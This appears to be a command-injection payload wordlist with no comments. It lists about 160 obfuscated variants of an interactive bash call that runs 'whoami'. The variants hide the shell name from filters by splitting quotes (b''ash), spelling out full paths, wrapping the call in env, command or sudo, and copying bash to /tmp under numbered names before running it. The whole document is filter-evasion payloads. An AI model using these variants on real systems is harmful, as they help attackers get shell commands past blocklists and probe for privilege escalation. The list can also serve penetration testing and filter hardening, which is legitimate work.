"bash"  -i -c "whoami"
"bash" -i -c "whoami"
"bash"-i -c "whoami"
'bash'  -i -c "whoami"
'bash' -i -c "whoami"
'bash'-i -c "whoami"
/bin/"bash"  -i -c "whoami"
/bin/"bash" -i -c "whoami"
/bin/"bash"-i -c "whoami"
/bin/'bash'  -i -c "whoami"
/bin/'bash' -i -c "whoami"
/bin/'bash'-i -c "whoami"
/bin/b""ash  -i -c "whoami"
/bin/b""ash -i -c "whoami"
/bin/b""ash-i -c "whoami"
/bin/b''ash  -i -c "whoami"
/bin/b''ash -i -c "whoami"
/bin/b''ash-i -c "whoami"
/bin/bash  -i -c "whoami"
/bin/bash -i -c "whoami"
/bin/bash-i -c "whoami"
/usr/bin/"bash"  -i -c "whoami"
/usr/bin/"bash" -i -c "whoami"
/usr/bin/"bash"-i -c "whoami"
/usr/bin/'bash'  -i -c "whoami"
/usr/bin/'bash' -i -c "whoami"
/usr/bin/'bash'-i -c "whoami"
/usr/bin/b""ash  -i -c "whoami"
/usr/bin/b""ash -i -c "whoami"
/usr/bin/b""ash-i -c "whoami"
/usr/bin/b''ash  -i -c "whoami"
/usr/bin/b''ash -i -c "whoami"
/usr/bin/b''ash-i -c "whoami"
/usr/bin/bash  -i -c "whoami"
/usr/bin/bash -i -c "whoami"
/usr/bin/bash-i -c "whoami"
b""ash  -i -c "whoami"
b""ash -i -c "whoami"
b""ash-i -c "whoami"
b''ash  -i -c "whoami"
b''ash -i -c "whoami"
b''ash-i -c "whoami"
bash  -i -c "whoami"
bash -i -c "whoami"
bash-i -c "whoami"
command "bash"  -i -c "whoami"
command "bash" -i -c "whoami"
command "bash"-i -c "whoami"
command 'bash'  -i -c "whoami"
command 'bash' -i -c "whoami"
command 'bash'-i -c "whoami"
command b""ash  -i -c "whoami"
command b""ash -i -c "whoami"
command b""ash-i -c "whoami"
command b''ash  -i -c "whoami"
command b''ash -i -c "whoami"
command b''ash-i -c "whoami"
command bash  -i -c "whoami"
command bash -i -c "whoami"
command bash-i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_48 && /tmp/tmp_bin_48 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_49 && /tmp/tmp_bin_49 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_5 && /tmp/tmp_bin_5 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_50 && /tmp/tmp_bin_50 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_51 && /tmp/tmp_bin_51 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_52 && /tmp/tmp_bin_52 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_53 && /tmp/tmp_bin_53 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_54 && /tmp/tmp_bin_54 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_55 && /tmp/tmp_bin_55 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_56 && /tmp/tmp_bin_56 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_57 && /tmp/tmp_bin_57 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_58 && /tmp/tmp_bin_58 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_59 && /tmp/tmp_bin_59 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_6 && /tmp/tmp_bin_6 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_60 && /tmp/tmp_bin_60 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_61 && /tmp/tmp_bin_61 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_62 && /tmp/tmp_bin_62 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_63 && /tmp/tmp_bin_63 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_64 && /tmp/tmp_bin_64 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_65 && /tmp/tmp_bin_65 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_66 && /tmp/tmp_bin_66 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_67 && /tmp/tmp_bin_67 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_68 && /tmp/tmp_bin_68 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_69 && /tmp/tmp_bin_69 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_7 && /tmp/tmp_bin_7 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_70 && /tmp/tmp_bin_70 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_71 && /tmp/tmp_bin_71 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_72 && /tmp/tmp_bin_72 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_73 && /tmp/tmp_bin_73 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_74 && /tmp/tmp_bin_74 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_75 && /tmp/tmp_bin_75 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_76 && /tmp/tmp_bin_76 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_77 && /tmp/tmp_bin_77 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_78 && /tmp/tmp_bin_78 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_79 && /tmp/tmp_bin_79 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_8 && /tmp/tmp_bin_8 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_80 && /tmp/tmp_bin_80 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_81 && /tmp/tmp_bin_81 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_82 && /tmp/tmp_bin_82 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_83 && /tmp/tmp_bin_83 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_84 && /tmp/tmp_bin_84 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_85 && /tmp/tmp_bin_85 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_86 && /tmp/tmp_bin_86 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_87 && /tmp/tmp_bin_87 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_88 && /tmp/tmp_bin_88 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_89 && /tmp/tmp_bin_89 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_9 && /tmp/tmp_bin_9 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_90 && /tmp/tmp_bin_90 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_91 && /tmp/tmp_bin_91 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_92 && /tmp/tmp_bin_92 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_93 && /tmp/tmp_bin_93 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_94 && /tmp/tmp_bin_94 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_95 && /tmp/tmp_bin_95 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_96 && /tmp/tmp_bin_96 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_97 && /tmp/tmp_bin_97 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_98 && /tmp/tmp_bin_98 -i -c "whoami"
cp $(which bash 2>/dev/null || echo bash) /tmp/tmp_bin_99 && /tmp/tmp_bin_99 -i -c "whoami"
env "bash"  -i -c "whoami"
env "bash" -i -c "whoami"
env "bash"-i -c "whoami"
env 'bash'  -i -c "whoami"
env 'bash' -i -c "whoami"
env 'bash'-i -c "whoami"
env -i "bash"  -i -c "whoami"
env -i "bash" -i -c "whoami"
env -i "bash"-i -c "whoami"
env -i 'bash'  -i -c "whoami"
env -i 'bash' -i -c "whoami"
env -i 'bash'-i -c "whoami"
env -i b""ash  -i -c "whoami"
env -i b""ash -i -c "whoami"
env -i b""ash-i -c "whoami"
env -i b''ash  -i -c "whoami"
env -i b''ash -i -c "whoami"
env -i b''ash-i -c "whoami"
env -i bash  -i -c "whoami"
env -i bash -i -c "whoami"
env -i bash-i -c "whoami"
env b""ash  -i -c "whoami"
env b""ash -i -c "whoami"
env b""ash-i -c "whoami"
env b''ash  -i -c "whoami"
env b''ash -i -c "whoami"
env b''ash-i -c "whoami"
env bash  -i -c "whoami"
env bash -i -c "whoami"
env bash-i -c "whoami"
sudo "bash"  -i -c "whoami"
sudo "bash" -i -c "whoami"
sudo "bash"-i -c "whoami"
sudo 'bash'  -i -c "whoami"
sudo 'bash' -i -c "whoami"
sudo 'bash'-i -c "whoami"
sudo b""ash  -i -c "whoami"
sudo b""ash -i -c "whoami"
sudo b""ash-i -c "whoami"
sudo b''ash  -i -c "whoami"
sudo b''ash -i -c "whoami"
sudo b''ash-i -c "whoami"
sudo bash  -i -c "whoami"
sudo bash -i -c "whoami"
sudo bash-i -c "whoami"
